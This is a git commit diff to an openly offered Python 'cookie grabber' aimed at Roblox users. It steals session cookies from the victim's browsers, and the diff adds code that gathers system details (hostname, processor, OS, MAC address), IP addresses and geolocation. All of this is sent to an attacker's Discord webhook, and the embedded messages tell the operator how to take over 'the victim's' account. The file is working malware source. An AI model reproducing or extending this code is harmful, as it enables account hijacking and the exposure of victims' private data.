2b0edf2a92255609ac3d838634fc5e993a68c230
Mr.Programs <127637860+independent-coder@users.noreply.github.com>
2023-08-04 12:23:25 -0400

    Update R0blUx-Gr@bber.py
    ADD SOME FEATURE SEE IN README

--- R0blUx-Gr@bber.py
+++ R0blUx-Gr@bber.py
@@ -1,4 +1,14 @@
-import robloxpy, requests, browser_cookie3, socket
+import json
+import platform
+import socket
+import urllib.request
+import uuid
+from urllib.request import urlopen
+
+import browser_cookie3
+import psutil
+import requests
+import robloxpy
 
 
 class SMTHGRB:
@@ -14,6 +24,53 @@ class SMTHGRB:
 
         self.browsers()
 
+    @staticmethod
+    def get_system_info():
+        # Hostname
+        hostname = platform.node()
+
+        # Processor
+        processor = platform.processor()
+
+        # RAM
+        ram = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
+
+        # Machine architecture
+        machine_architecture = platform.machine()
+
+        # OS
+        os_name = platform.system()
+
+        # OS release
+        os_release = platform.release()
+
+        # OS version
+        os_version = platform.version()
+
+        # MAC address
+        mac_address = ':'.join(f'{octet:02x}' for octet in uuid.getnode().to_bytes(6, 'big'))
+
+        return {
+            "Hostname": hostname,
+            "Processor": processor,
+            "RAM": ram,
+            "Machine Architecture": machine_architecture,
+            "OS": os_name,
+            "OS Release": os_release,
+            "OS Version": os_version,
+            "MAC Address": mac_address
+        }
+
+    @staticmethod
+    def ip4():  # Get ipv4
+        try:
+            with urlopen('https://4.ident.me') as response:
+                return response.read().decode('ascii')
+        except:
+            with urlopen('https://4.tnedi.me') as response:
+                return response.read().decode('ascii')
+    ip_address = ip4()
+
     def checker(self):
         if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
             return requests.post(url=self.webhook, data={
@@ -26,26 +83,46 @@ class SMTHGRB:
             ip = requests.get('https://api.ipify.org/').text
         except:
             ip = "N/A"
-
+        url = 'http://ipinfo.io/json'
         response = requests.get(f"http://ip-api.com/json/{ip}").json()
         city = response['city']
         region_name = response['regionName']
         country = response['country']
         latitude = response['lat']
         longitude = response['lon']
-        # Here you can modify the message that will be sent
+        response = urllib.request.urlopen(url)
+        data = json.load(response)
+        hostnameISP = data['hostname']
 
+        # Retrieve the system information using get_system_info() method
+        system_info = self.get_system_info()
+
+        # Here you can modify the message that will be sent
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
+
+
 
         self.embeds.append(
             {
                 "title": f"✔ Valid Account - {self.platform}",
-                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfos\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
+                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfo's\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
                                f"\n See the cookie at the other message !",
-                "color": 12452044,
+                "color": 15426612,
                 "footer": {
                     "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
+                }
+            }
+        )
+
+        self.embeds.append(
+            {
+                "title": f"Computer info's",
+                "description": f"Hostname: {hostnameISP} \n\n IPv4 Address:||**{ip_address}**||\n "
+                               f"Sys info \n\n Hostname: {system_info['Hostname']}\n\n Processor: {system_info['Processor']}\n\n RAM: {system_info['RAM']}\n\n Machine Architecture: {system_info['Machine Architecture']}\n\n OS: {system_info['OS']}\n\n OS Release: {system_info['OS Release']}\n\n OS Version: {system_info['OS Version']}\n\n MAC Address: {system_info['MAC Address']}\n\n",
+                "color": 7858996,
+                "footer": {
+                    "text": "v1.0.2 ; Computer-Inf by Independent-coder"
                 }
             }
         )
@@ -60,7 +137,7 @@ class SMTHGRB:
                                f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
                                f"\n Refresh and you are into his account !"
                                f"\n Thanks for using my cookies grabber for roblox !",
-                "color": 12452044,
+                "color": 3440107,
                 "footer": {
                     "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                 }
@@ -179,5 +256,6 @@ class SMTHGRB:
         })
 
 
+
 SMTHGRB(
-    "PUT YOUR DISCORD WEBHOOK")
+    "PUT YOUR DISOCRD WEBHOOK URL")
